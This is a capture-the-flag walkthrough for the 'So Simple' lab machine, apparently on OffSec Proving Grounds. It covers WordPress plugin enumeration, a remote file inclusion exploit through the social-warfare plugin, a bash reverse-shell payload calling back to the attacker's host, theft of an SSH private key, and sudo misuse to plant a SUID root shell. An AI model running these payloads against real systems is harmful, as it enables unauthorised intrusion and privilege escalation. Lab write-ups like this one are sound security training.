---
layout: default
title: So Simple
parent: Proving Grounds Play
nav_order: 9
---

# Scanning

---

```bash
sudo nmap -Pn -p- -sC -sV -T4 --open 192.168.172.78
```

# Enumeration

---

## 80 - HTTP

Gobuster discovers _/wordpress_.

Run _wpscan_ to reveal a vulnerable plugin _social-warefare_ version 3.5.0

```bash
wpscan --url http://192.168.172.78/wordpress/ --enumerate p --plugins-detection aggressive
```

![wpscan](../../../assets/images/ctfs/proving_grounds/sosimple/wpscan.png)

Reviewing exploits on Exploit-DB there is a POC that shows a vulnerable path.

![exploitdb](../../../assets/images/ctfs/proving_grounds/sosimple/exploitdb.png)

# Exploitation

---

## RFI

Run an initial test to display _phpinfo()_

```bash
vim evil.txt
<pre>
phpinfo();
</pre>
```

Start a Python web server and run RFI test in browser.

![rfi](../../../assets/images/ctfs/proving_grounds/sosimple/rfi.png)

Now run a reverse shell payload through the RFI vulnerable web page.

First create a new _evil.txt_ with the following bash reverse shell one-liner.

```bash
<pre>
system("/bin/bash -c '/bin/bash -i >& /dev/tcp/192.168.45.217/9001 0>&1'");
</pre>
```

Run the following URL payload

```bash
192.168.222.78/wordpress/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://192.168.45.217:8000/evil.txt
```

Observe the _evil.txt_ file download to the target machine and the netcat listener spawn a reverse shell.

![shell](../../../assets/images/ctfs/proving_grounds/sosimple/shell.png)

# Post-Exploitation

---

## SSH as Max

We have access to the _.ssh/id_rsa_ private key for Max

Copy to the attack box and pivot to the Max user.

![id_rsa](../../../assets/images/ctfs/proving_grounds/sosimple/id_rsa.png)

![ssh](../../../assets/images/ctfs/proving_grounds/sosimple/ssh.png)

## Check SUDO Permissions for Max

We can run _/usr/sbin/service_ as user _steven_

![sudo](../../../assets/images/ctfs/proving_grounds/sosimple/sudo.png)

## SU to Steven

```bash
sudo -u steven /usr/sbin/service ../../../../bin/bash
```

![steven](../../../assets/images/ctfs/proving_grounds/sosimple/steven.png)

## Check SUDO Permissions for Steven

![sudo_steven](../../../assets/images/ctfs/proving_grounds/sosimple/sudo_steven.png)

We can run _/opt/tools/server-health.sh_ as root.

Checking _/opt_ permissions we see Steven is the owner.

![opt](../../../assets/images/ctfs/proving_grounds/sosimple/opt.png)

Create _/opt/tools/server-health.sh_ to spawn a _/bin/bash_ shell from _/var/tmp/bash_

```bash
# create the /opt/tools directory
mkdir /opt/tools

# create server-health.sh script
vi server-health.sh

# create root shell bash script
#!/bin/bash

cp /bin/bash /var/tmp/bash ; chmod u+s /var/tmp/bash

```

![script](../../../assets/images/ctfs/proving_grounds/sosimple/script.png)

Make _server-health.sh_ executable and execute with sudo command to generate the malicious _bash_ script

```bash
sudo -u root /opt/tools/server-health.sh
```

Execute the malicious _/var/tmp/bash_ binary with the _-p_ flag to persist root privileges

![root](../../../assets/images/ctfs/proving_grounds/sosimple/root.png)
